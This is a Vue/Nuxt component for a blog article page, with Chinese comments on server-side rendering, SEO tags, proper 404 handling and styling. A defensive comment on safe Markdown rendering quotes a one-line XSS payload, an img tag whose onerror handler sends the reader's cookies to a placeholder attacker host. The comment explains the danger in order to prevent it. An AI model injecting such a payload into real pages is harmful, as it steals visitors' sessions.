<template>
  <div class="art-page">
    <div class="art-wrap">

      <!-- 返回 -->
      <a class="back" href="/" @click.prevent="goHome">← 返回首页</a>

      <!-- ① 加载中 -->
      <div v-if="pending" class="state">加载中…</div>

      <!-- ② 没找到（不存在 / 是草稿 / 已下架 / 已删除，对访客来说都是同一种结果） -->
      <div v-else-if="!article" class="state">
        <b>这篇文章不见了</b>
        <p>{{ errMsg }}</p>
        <button class="btn" @click="goHome">回到首页</button>
      </div>

      <!-- ③ 正文 -->
      <article v-else class="doc">
        <header class="doc-head">
          <span v-if="article.categoryName" class="doc-cat">{{ article.categoryName }}</span>
          <h1 class="doc-title">{{ article.title }}</h1>
          <div class="doc-meta">
            <span>{{ fmtDate(article.createTime) }}</span>
            <span class="dot">·</span>
            <span>{{ article.viewCount }} 次浏览</span>
            <span v-if="article.isTop === 1" class="doc-top">置顶</span>
          </div>
          <img v-if="article.cover" class="doc-cover" :src="article.cover" :alt="article.title" >
        </header>

        <MdPreview :model-value="article.content || ''" theme="dark" :language="zh_CN" />
      </article>

      <footer v-if="article" class="doc-foot">
        <span>── 完 ──</span>
        <button class="btn" @click="goHome">回到首页</button>
      </footer>

    </div>
  </div>
</template>

<script setup>
// MdPreview 是"只读渲染"版，不带动编辑器那套（体积小很多）。
// 样式引 preview.css 而不是 style.css —— 详情页不需要编辑器样式。
import { MdPreview, zh_CN } from 'md-editor-v3'
import 'md-editor-v3/lib/preview.css'

/*
 * 【安全关键】正文为什么用 MdPreview 渲染，而不是自己 v-html？
 *
 * Markdown 里是可以塞原始 HTML 的 —— 比如写一句
 *     <img src=x onerror="fetch('http://坏人/'+document.cookie)">
 * 如果直接 v-html 塞进页面，这段脚本会在【每一个读者】的浏览器里执行。
 * 你自己写的文章当然没事，但这是博客系统最经典的 XSS 入口。
 *
 * MdPreview 内部接了 xss 库做白名单过滤，危险标签和属性会被清掉。
 * 自己写 v-html 就必须自己接 DOMPurify —— 一旦漏了就是全站 XSS。
 *
 * 【为什么这段注释写在这里而不是模板里？】
 * 模板里的 HTML 注释会被原样序列化进最终 HTML 发给每个访客
 * （上面那句 onerror 示例就因此出现在了页面源码里）。
 * JS 注释则会被打包器剥掉。凡是带敏感示例的说明，都写进 <script>。
 */

const route = useRoute()
const { request } = useApi()

/**
 * 【为什么用 useAsyncData，而不是 onMounted + ref？】
 * 因为这是博客的正文页 —— 内容必须出现在服务端返回的 HTML 里，否则：
 *   ① 搜索引擎抓到的是一张空壳，文章等于没被收录（SSR 博客的核心价值就在这）
 *   ② 首屏会先闪一下"加载中"再出内容，观感差
 * useAsyncData 会在服务端【等数据回来再渲染】，HTML 里直接带着正文。
 *
 * key 里带上文章 id：它是"这份数据属于哪篇文章"的标识，
 * 写死成 'article' 的话，从第 12 篇点到第 13 篇会拿到上一篇的缓存。
 *
 * 对比一下首页：首页这次也改成了 useAsyncData（理由见那里的注释）。
 */
const { data: res, pending } = await useAsyncData(
  'article-' + route.params.id,
  () => request('/article/' + route.params.id),
)

const article = computed(() => (res.value?.ok ? res.value.data : null))
const errMsg = computed(() => res.value?.message || '它可能已被删除，或者还只是一篇没发布的草稿。')

/*
 * 【SEO】标题、摘要、og、canonical 都交给 useSeoMetaFor 拼（规则在 app/utils/seo.ts）。
 *
 * 改之前这里只有一句 useHead({ title })，没有 description / og / canonical：
 * 链接分享到微信就是一行光秃秃的地址，搜索引擎也只能自己从正文里截一段当摘要。
 *
 * 两个细节：
 *   · description 用文章自己的 summary；没写摘要时回落到站点描述
 *     （空 description 等于把"这段话"交给抓取方随便猜）
 *   · 封面是相对路径（/uploads/xxx.png），og:image 要求绝对地址，
 *     所以交给 absoluteUrl 拼一次 —— 抓取方拿到相对路径会直接当成没有图
 */
useSeoMetaFor(() => ({
  path: '/article/' + route.params.id,
  title: article.value?.title,
  description: article.value?.summary,
  type: 'article',
  image: article.value?.cover,
  // 【软 404 的页面不该被索引】文章不存在 / 是草稿 / 已下架时，这个地址
  // 没有任何内容可给搜索引擎 —— 但下面那个 createError 抛出去之后，
  // 错误页的 head 由 error.vue 接管，这里先声明 noindex 更稳妥
  noindex: !article.value,
}))

/*
 * 【SEO 关键】文章不存在时，必须让服务端返回真正的 HTTP 404。
 *
 * 如果只是渲染一句"文章不见了"但状态码仍是 200，这叫【软 404】：
 * 搜索引擎会认为"这个 URL 的内容就是一张报错图"，然后把它收录进索引，
 * 结果你的 404 页面反而被搜出来了。
 *
 * 用 createError 抛出去，Nuxt 会：
 *   ① 把 HTTP 状态码设成 404
 *   ② 渲染 app/error.vue（我们自己写的、和站点同风格的错误页）
 * 这比手写 setResponseStatus 可靠 —— 后者在页面正常渲染时会被覆盖掉（实测无效）。
 */
if (res.value && !res.value.ok) {
  throw createError({
    statusCode: res.value.code === 404 ? 404 : 500,
    statusMessage: '文章不存在',
    data: { from: 'article' },
  })
}

const goHome = () => navigateTo('/')
const fmtDate = (t) => (t ? String(t).replace('T', ' ').slice(0, 10) : '')
</script>

<style scoped>
.art-page { min-height: 70vh; }
.art-wrap { max-width: 860px; margin: 0 auto; padding: 32px 24px 64px; }

.back {
  display: inline-block; margin-bottom: 18px; color: var(--muted);
  font-size: 14px; text-decoration: none; cursor: pointer; transition: color .2s;
}
.back:hover { color: var(--accent); }

.state { text-align: center; padding: 80px 24px; border-radius: 20px; color: var(--muted); }
.state b { display: block; font-size: 20px; color: var(--ink); margin-bottom: 10px; }
.state p { margin: 0 0 22px; font-size: 14px; line-height: 1.7; }
.btn {
  background: rgba(30,47,82,.66); border: 1px solid rgba(180,210,245,.18);
  color: var(--ink); padding: 9px 26px; border-radius: 999px; cursor: pointer;
  font-size: 14px; transition: border-color .2s, color .2s;
}
.btn:hover { border-color: rgba(242,193,78,.5); color: var(--accent); }

/* 【性能考虑】正文面板用"几乎不透明的深色底"而不是 .glass 毛玻璃。
   原因：文章很长，一整块大面积的 backdrop-filter 会对背后的播放中视频
   做实时重采样 —— 这是首页那次卡顿的同款问题，而且面积还更大。
   阅读场景本来也需要更实的背景来保证对比度。 */
.doc {
  /* 0.96 而不是 0.88：正文是长文，背景透光率哪怕只有 12%，
     在一张高对比度的背景图上也会明显干扰阅读（实测截图里画作清晰可见）。
     这里故意不做 backdrop-filter —— 一整块大面积实时模糊会对背后的播放中视频
     逐帧重采样，是首页那次卡顿的同款问题，而且面积更大。 */
  background: rgba(13,22,43,.96);
  border: 1px solid rgba(180,210,245,.14);
  border-radius: 22px;
  padding: 40px 44px 48px;
  box-shadow: inset 0 1px 0 rgba(255,255,255,.06), 0 24px 60px rgba(0,0,0,.35);
}
.doc-head { margin-bottom: 28px; padding-bottom: 24px; border-bottom: 1px solid rgba(150,190,240,.12); }
.doc-cat {
  display: inline-block; font-size: 12px; color: #cfe0f0;
  border: 1px solid rgba(180,210,245,.25); border-radius: 999px;
  padding: 2px 12px; margin-bottom: 14px;
}
.doc-title { font-size: 32px; font-weight: 800; line-height: 1.35; margin: 0 0 14px; color: var(--ink); }
.doc-meta { display: flex; align-items: center; gap: 10px; color: var(--muted); font-size: 13px; flex-wrap: wrap; }
.doc-meta .dot { opacity: .5; }
.doc-top { color: var(--accent); border: 1px solid rgba(242,193,78,.45); border-radius: 999px; padding: 1px 10px; font-size: 12px; }
.doc-cover { width: 100%; border-radius: 16px; margin-top: 22px; display: block; }

.doc-foot { text-align: center; margin-top: 34px; color: var(--muted); font-size: 13px; display: flex; flex-direction: column; align-items: center; gap: 18px; letter-spacing: 2px; }

/* ===== md-editor-v3 预览区暗色适配 =====
   和后台编辑器用同一套主题变量，保证文章在"后台预览"和"前台阅读"里长得一样。 */
:deep(.md-editor-dark) {
  --md-bk-color: transparent;
  --md-color: #dce7f8;
  --md-border-color: rgba(150,190,240,.16);
  --md-hover-color: #ffffff;
  --md-scrollbar-bg-color: rgba(255,255,255,.04);
  --md-scrollbar-thumb-color: rgba(150,190,240,.28);
}
:deep(.md-editor-preview) { background: transparent; font-size: 15px; line-height: 1.85; }
:deep(.md-editor-preview h1),
:deep(.md-editor-preview h2),
:deep(.md-editor-preview h3) { color: var(--ink); }
:deep(.md-editor-preview a) { color: var(--accent); }
:deep(.md-editor-preview code) { color: #8be9fd; }
:deep(.md-editor-preview blockquote) {
  border-left: 3px solid var(--accent);
  background: rgba(242,193,78,.06);
  color: var(--muted);
}

/* 窄屏：减小内边距，标题降字号 */
@media (max-width: 720px) {
  .art-wrap { padding: 20px 16px 48px; }
  .doc { padding: 26px 20px 32px; border-radius: 18px; }
  .doc-title { font-size: 24px; }
}
</style>
